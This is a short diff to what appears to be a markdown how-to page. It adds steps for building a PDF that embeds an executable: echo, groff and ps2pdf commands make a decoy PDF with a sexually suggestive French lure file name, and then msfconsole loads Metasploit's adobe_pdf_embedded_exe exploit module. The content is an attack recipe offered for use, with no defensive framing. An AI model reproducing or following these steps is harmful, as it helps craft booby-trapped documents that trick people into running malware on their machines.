@@ -30,6 +30,10 @@
 
 ## HOW TO CREATE PDF COMPATIBLE FOR EMBED EXE FILE IN
 
-<code>echo "Hello world!" > femmes_toutes_nues.txt</code>
-<code>groff -Tps femmes_toutes_nues.txt > femmes_toutes_nues.ps </code>
-<code>ps2pdf femmes_toutes_nues.ps </code>
+* <code>echo "Hello world!" > femmes_toutes_nues.txt</code>
+* <code>groff -Tps femmes_toutes_nues.txt > femmes_toutes_nues.ps </code>
+* <code>ps2pdf femmes_toutes_nues.ps </code>
+
+* <code> msfconsole </code>
+* <code> use exploit/windows/fileformat/adobe_pdf_embedded_exe </code>
+
